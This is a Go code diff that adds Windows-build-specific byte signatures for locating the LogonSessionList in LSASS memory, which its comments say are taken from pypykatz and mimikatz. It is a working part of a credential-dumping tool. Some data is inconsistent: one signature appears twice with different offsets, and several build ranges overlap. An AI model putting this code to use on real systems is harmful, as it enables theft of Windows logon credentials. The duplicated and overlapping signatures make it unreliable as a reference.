@@ -38,14 +38,28 @@ type logonSessionListVariant struct {
 
 // logonSessionListVariants lists sigscan patterns in preference order (newest
 // first). findLogonSessionListAnchor tries each until one matches.
+//
+// Patterns derived from pypykatz lsa_template_nt6.py (MsvTemplate.get_template)
+// and mimikatz kuhl_m_sekurlsa.c. Each covers a specific Windows build range.
 var logonSessionListVariants = []logonSessionListVariant{
 	{
-		// Win10 21H2 — Win11 23H2 (mimikatz signature_x64_w8)
-		// +0  33 F6              XOR ESI, ESI
-		// +2  89 77 00           MOV [RDI+0], ESI
-		// +5  4C 8D 4D D0        LEA R9, [RBP-30h]
-		// +9  4C 8B 05 ??x4      MOV R8, [RIP+disp32] ← LogonSessionList
-		// +16 48 8D 1D ??x4      LEA RBX, [RIP+disp32]
+		// Win11 22H2–23H2 (builds 22621–26099, pypykatz WIN_11_2023)
+		Name:             "Win11_22H2_23H2",
+		Signature:        "45 89 37 4C 8B F7 8B F3 45 85 C0 0F",
+		MovInstrOffset:   24,
+		MovInstrLen:      7,
+		MovDispFieldOffs: 3,
+	},
+	{
+		// Server 2022 / Win11 21H2 (builds 20348–22620, pypykatz WIN_11_2022)
+		Name:             "Server2022_Win11_21H2",
+		Signature:        "45 89 34 24 4C 8B FF 8B F3 45 85 C0 74",
+		MovInstrOffset:   21,
+		MovInstrLen:      7,
+		MovDispFieldOffs: 3,
+	},
+	{
+		// Win10 21H2 — Win11 23H2 (mimikatz signature_x64_w8 — broad fallback)
 		Name:             "Win10_21H2_Win11_23H2",
 		Signature:        "33 F6 89 77 00 4C 8D 4D D0 4C 8B 05 ?? ?? ?? ?? 48 8D 1D ?? ?? ?? ??",
 		MovInstrOffset:   9,
@@ -53,16 +67,34 @@ var logonSessionListVariants = []logonSessionListVariant{
 		MovDispFieldOffs: 3,
 	},
 	{
-		// Win10 1607 — 1809 / Server 2016 — 2019 (builds 14393–17763)
-		// +0  33 FF              XOR EDI, EDI
-		// +2  41 89 37           MOV [R15], ESI
-		// +5  4C 8B F3           MOV R14, RBX
-		// +8  45 85 C0           TEST R8D, R8D
-		// ... (9 more bytes of surrounding code)
-		// +20 4C 8B 05 ??x4     MOV R8, [RIP+disp32] ← LogonSessionList
-		Name:             "Win10_1607_1809_Server2016_2019",
-		Signature:        "33 FF 41 89 37 4C 8B F3 45 85 C0",
+		// Win10 1903–21H1 (builds 18362–19045, pypykatz WIN_10_1903)
+		Name:             "Win10_1903_21H1",
+		Signature:        "33 FF 41 89 37 4C 8B F3 45 85 C0 74",
 		MovInstrOffset:   20,
+		MovInstrLen:      7,
+		MovDispFieldOffs: 3,
+	},
+	{
+		// Win10 1803–1809 / Server 2019 (builds 17134–17763, pypykatz WIN_10_1803)
+		Name:             "Win10_1803_Server2019",
+		Signature:        "33 FF 41 89 37 4C 8B F3 45 85 C9 74",
+		MovInstrOffset:   20,
+		MovInstrLen:      7,
+		MovDispFieldOffs: 3,
+	},
+	{
+		// Win10 1703 (build 15063, pypykatz WIN_10_1703)
+		Name:             "Win10_1703",
+		Signature:        "33 FF 45 89 37 48 8B F3 45 85 C9 74",
+		MovInstrOffset:   20,
+		MovInstrLen:      7,
+		MovDispFieldOffs: 3,
+	},
+	{
+		// Win10 1507–1607 / Server 2016 (builds 10240–14393, pypykatz WIN_10_1507)
+		Name:             "Win10_1507_Server2016",
+		Signature:        "33 FF 41 89 37 4C 8B F3 45 85 C0 74",
+		MovInstrOffset:   13,
 		MovInstrLen:      7,
 		MovDispFieldOffs: 3,
 	},
